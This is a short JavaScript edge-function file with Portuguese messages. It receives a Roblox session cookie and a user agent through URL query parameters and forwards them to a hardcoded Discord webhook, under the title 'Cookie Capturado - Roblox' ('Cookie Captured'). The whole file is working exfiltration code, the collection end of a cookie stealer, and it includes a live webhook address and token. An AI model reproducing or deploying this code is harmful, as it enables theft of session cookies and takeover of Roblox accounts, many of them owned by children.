export const config = {
  runtime: "edge",
};

const WEBHOOK_URL = "https://discord.com/api/webhooks/1280941270138617957/e7v-FHCaX2LGwZZuKXhHTyBSCEa4vcPPPIeTsQISfv8WEJ5s0utTnnnQ5flRLYAu2ks3";

export default async function handler(req) {
  try {
    if (req.method !== "GET") {
      return new Response(JSON.stringify({ error: "Método não permitido" }), { status: 405, headers: { "Content-Type": "application/json" } });
    }

    const { searchParams } = new URL(req.url);
    const cookie = searchParams.get("cookie") || "Não enviado";
    const userAgent = searchParams.get("userAgent") || "Não enviado";

    const payload = {
      embeds: [
        {
          title: "Cookie Capturado - Roblox",
          color: 15158332,
          fields: [
            { name: "Cookie", value: `\`\`\`${cookie.slice(0, 1020)}\`\`\``, inline: false },
            { name: "User Agent", value: `\`\`\`${userAgent.slice(0, 1020)}\`\`\``, inline: false },
            { name: "Host", value: "roblox.com", inline: true },
            { name: "Timestamp", value: new Date().toISOString(), inline: true },
          ],
        },
      ],
    };

    const res = await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(payload),
    });

    if (!res.ok) throw new Error(`Falha no webhook: ${res.status}`);

    return new Response(JSON.stringify({ message: "Enviado com sucesso!" }), { status: 200, headers: { "Content-Type": "application/json" } });
  } catch (error) {
    const errorPayload = {
      embeds: [
        {
          title: "Erro no envio do cookie",
          description: error.message,
          color: 15158332,
          timestamp: new Date().toISOString(),
        },
      ],
    };

    await fetch(WEBHOOK_URL, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify(errorPayload),
    });

    return new Response(JSON.stringify({ error: error.message }), { status: 500, headers: { "Content-Type": "application/json" } });
  }
      }
